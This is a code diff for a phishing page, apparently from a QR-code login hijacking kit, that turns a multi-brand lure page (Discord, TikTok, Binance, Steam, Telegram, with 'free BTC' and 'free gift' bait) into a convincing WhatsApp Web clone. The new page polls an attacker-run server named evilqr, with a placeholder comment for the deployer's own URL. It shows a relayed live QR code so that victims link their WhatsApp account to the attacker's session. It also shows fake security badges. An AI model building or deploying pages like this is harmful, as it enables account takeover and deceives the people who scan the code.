@@ -1,143 +1,215 @@
-<html>
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>Discord | Login</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        body {
-            background-color: #5d66f6;
-            color: #b4b6ba;
-            font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
 
-        h3 {
-            color: #fff;
-            font-size: 2em;
-            font-weight: 900;
+        body {
+            background-color: #f0f2f5;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+            color: #41525d;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+        }
+
+        /* Top Green Bar */
+        .header {
+            background-color: #00a884;
+            height: 127px;
+            width: 100%;
+            position: absolute;
+            top: 0;
+            z-index: -1;
         }
 
         .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex-grow: 1;
+            padding: 20px;
+            margin-top: 40px;
+        }
+
+        .box {
+            background-color: #ffffff;
+            border-radius: 3px;
+            box-shadow: 0 17px 50px 0 rgba(11,20,26,.19), 0 12px 15px 0 rgba(11,20,26,.24);
             width: 100%;
-            padding: 32px 32px;
+            max-width: 1000px;
+            display: flex;
+            padding: 60px;
+            align-items: center;
+            justify-content: center;
+            gap: 60px;
         }
 
-        #box {
-            width: 260px;
-            /*height: 340px;*/
-            background-color: #36393f;
-            border-radius: 10px;
-            padding: 64px;
-            margin: auto;
-            filter: drop-shadow(4px 4px 8px black);
+        .info-section {
+            flex: 1;
+            max-width: 450px;
         }
 
-        .qr-box {
-            margin: auto;
-        }
-
-        .qr-message {
-            text-align: center;
-        }
-
-        .box-message {
-            line-height: 20px;
+        .info-section h1 {
+            font-size: 28px;
+            font-weight: 400;
+            color: #41525d;
             margin-bottom: 24px;
         }
 
+        .info-section p {
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .info-section ol {
+            margin-left: 20px;
+            margin-bottom: 20px;
+            color: #41525d;
+            line-height: 1.6;
+        }
+
+        .info-section li {
+            margin-bottom: 8px;
+        }
+
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            font-size: 14px;
+            color: #8696a0;
+            margin-top: 40px;
+        }
+
+        .secure-badge svg {
+            width: 14px;
+            height: 14px;
+            fill: #8696a0;
+        }
+
+        /* The QR Code Area */
+        .qr-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .qr-wrapper {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #e9edef;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 280px;
+            height: 280px;
+        }
+
         #qrCode {
-            margin: auto;
-            padding: 12px;
-            background-color: #fff;
-            border-radius: 16px;
-            max-width: 180px;
+            width: 240px;
+            height: 240px;
+            display: none;
+            border-radius: 8px;
+        }
+
+        /* Loading spinner while waiting for the extension */
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #00a884;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .refresh-text {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #00a884;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .footer {
+            margin-top: auto;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #8696a0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .footer svg {
+            width: 16px;
+            height: 16px;
+            fill: #8696a0;
         }
     </style>
 </head>
-
 <body>
 
+    <div class="header"></div>
+
     <div class="container">
-        <div id="box">
-            <div class="qr-box">
-                <img id="qrCode" alt="Scan me!" style="display: none;">
+        <div class="box">
+            <div class="info-section">
+                <h1>Use WhatsApp on your computer</h1>
+                <ol>
+                    <li>Open WhatsApp on your phone</li>
+                    <li>Tap <strong>Menu</strong> on Android, or <strong>Settings</strong> on iPhone</li>
+                    <li>Tap <strong>Linked devices</strong> and then <strong>Link a device</strong></li>
+                    <li>Point your phone to this screen to capture the code</li>
+                </ol>
+                <div class="secure-badge">
+                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                    Your personal messages are end-to-end encrypted
+                </div>
             </div>
-            <div class="qr-message">
-                <div class="box-heading">
-                    <h3 id="title">Scan QR Code</h3>
+            
+            <div class="qr-section">
+                <div class="qr-wrapper" id="qrWrapper">
+                    <div class="spinner" id="spinner"></div>
+                    <img id="qrCode" alt="QR Code">
                 </div>
-                <div id="message" class="box-message">Scan this with the <strong>mobile app</strong> to get <strong>instant
-                        rewards</strong>.
-                </div>
-                <div id="guide"></div>
+                <a class="refresh-text" onclick="location.reload();">Need to refresh the QR code?</a>
             </div>
         </div>
     </div>
 
+    <div class="footer">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        WhatsApp Secure Connection
+    </div>
+
     <script>
-
-        const API_URL = "http://127.0.0.1:35000";
+        // YOUR RENDER URL GOES HERE
+        const API_URL = "https://evilqr-j7e7.onrender.com";
         const QRCODE_ID = "11111111-1111-1111-1111-111111111111";
-
-        function updatePage(host) {
-            console.log("update: " + host);
-            switch (host) {
-                case "web.whatsapp.com":
-                    document.querySelector("body").style.backgroundColor = "#00a884";
-                    document.querySelector("body").style.color = "#b4b6ba";
-                    document.querySelector("h3").style.color = "#fff";
-                    document.querySelector("#box").style.backgroundColor = "#36393f";
-                    document.querySelector("#title").innerHTML = "Join Call";
-                    document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Whatsapp</strong> application to <strong>join the call</strong>.";
-                    document.querySelector("#guide").innerHTML = "[ <strong>⁝</strong> > <strong>Linked devices</strong> > <strong>Link a device</strong> ]";
-                    break;
-                case "discord.com":
-                    document.querySelector("body").style.backgroundColor = "#5d66f6";
-                    document.querySelector("body").style.color = "#b4b6ba";
-                    document.querySelector("h3").style.color = "#fff";
-                    document.querySelector("#box").style.backgroundColor = "#36393f";
-                    document.querySelector("#title").innerHTML = "Invite pending";
-                    document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Discord</strong> application to <strong>join the server</strong>.";
-                    document.querySelector("#guide").innerHTML = "[ <strong>Profile</strong> > <strong>Scan QR Code</strong> ]";
-                    break;
-                case "www.tiktok.com":
-                    document.querySelector("body").style.backgroundColor = "#ef2a50";
-                    document.querySelector("body").style.color = "#000";
-                    document.querySelector("h3").style.color = "#000";
-                    document.querySelector("#box").style.backgroundColor = "#fff";
-                    document.querySelector("#title").innerHTML = "Account Boost";
-                    document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>TikTok</strong> application to give your account a <strong>permanent boost</strong>.";
-                    document.querySelector("#guide").innerHTML = "[ <strong>Profile</strong> > <strong>Scan QR Code</strong> ]";
-                    break;
-                case "accounts.binance.com":
-                    document.querySelector("body").style.backgroundColor = "#fcd949";
-                    document.querySelector("body").style.color = "#000";
-                    document.querySelector("h3").style.color = "#000";
-                    document.querySelector("#box").style.backgroundColor = "#fff";
-                    document.querySelector("#title").innerHTML = "Free Bitcoins";
-                    document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Binance</strong> application to receive <strong>receive free BTC</strong>.";
-                    document.querySelector("#guide").innerHTML = "[ <strong>Profile</strong> > <strong>Scan QR Code</strong> ]";
-                    break;
-                case "store.steampowered.com":
-                    document.querySelector("body").style.backgroundColor = "#181a21";
-                    document.querySelector("body").style.color = "#b4b6ba";
-                    document.querySelector("h3").style.color = "#fff";
-                    document.querySelector("#box").style.backgroundColor = "#36393f";
-                    document.querySelector("#title").innerHTML = "Free Gift";
-                    document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Steam</strong> application to <strong>receive a free game gift</strong>.";
-                    document.querySelector("#guide").innerHTML = "[ Open <strong>Steam Guard</strong> ]";
-                    break;
-                case "web.telegram.org":
-                    document.querySelector("body").style.backgroundColor = "#8775e4";
-                    document.querySelector("body").style.color = "#b4b6ba";
-                    document.querySelector("h3").style.color = "#fff";
-                    document.querySelector("#box").style.backgroundColor = "#212121";
-                    document.querySelector("#title").innerHTML = "Join Channel";
-                    document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Telegram</strong> application to <strong>join the channel</strong>.";
-                    document.querySelector("#guide").innerHTML = "[ <strong>⁝</strong> > <strong>Settings</strong> > <strong>Devices</strong> > <strong>Link Desktop Device</strong> ]";
-            }
-        }
 
         function updateQR(t) {
             var url = API_URL + "/qrcode/" + QRCODE_ID;
@@ -145,46 +217,49 @@
                 url += "?t=" + t;
             }
             console.log("fetching: " + url);
+            
             fetch(url, {
                 method: "GET",
                 headers: {
                     "Content-Type": "application/json"
                 }
             })
-                .then((response) => {
+            .then((response) => {
+                if (response.status == 200) {
+                    return response.json();
+                } else if (response.status == 408) {
+                    console.log("timed out, retrying...");
+                    updateQR(t);
+                } else {
+                    throw "http error: " + response.status;
+                }
+            })
+            .then((data) => {
+                if (data !== undefined && data.host === "web.whatsapp.com") {
+                    console.log("api: success:", data);
 
-                    if (response.status == 200) {
-                        return response.json();
-                    } else if (response.status == 408) {
-                        console.log("timed out");
-                        updateQR(t);
-                    } else {
-                        throw "http error: " + response.status;
-                        //return response.error("http error");
-                        //setTimeout(function () { updateQR(t) }, 10000);
+                    var img = document.getElementById("qrCode");
+                    var spinner = document.getElementById("spinner");
+                    
+                    if (img != null) {
+                        img.src = data.source;
+                        img.style.display = "block";
+                        spinner.style.display = "none"; // Hide spinner when image loads
                     }
-                })
-                .then((data) => {
-                    if (data !== undefined) {
-                        console.log("api: success:", data);
-
-                        var o = document.getElementById("qrCode");
-                        if (o != null) {
-                            o.src = data.source;
-                            o.style = "display: block";
-                        }
-                        updatePage(data.host);
-                        updateQR(data.update_time);
-                    }
-                })
-                .catch((error) => {
-                    console.error("api: error:", error);
-                    setTimeout(function () { updateQR(t) }, 10000);
-                });
+                    updateQR(data.update_time);
+                } else {
+                    // If the host isn't WhatsApp yet, keep polling
+                    setTimeout(function () { updateQR(t) }, 2000);
+                }
+            })
+            .catch((error) => {
+                console.error("api: error:", error);
+                setTimeout(function () { updateQR(t) }, 2000);
+            });
         }
-        updateQR(0);
 
+        // Start polling immediately
+        updateQR(0);
     </script>
 </body>
-
 </html>
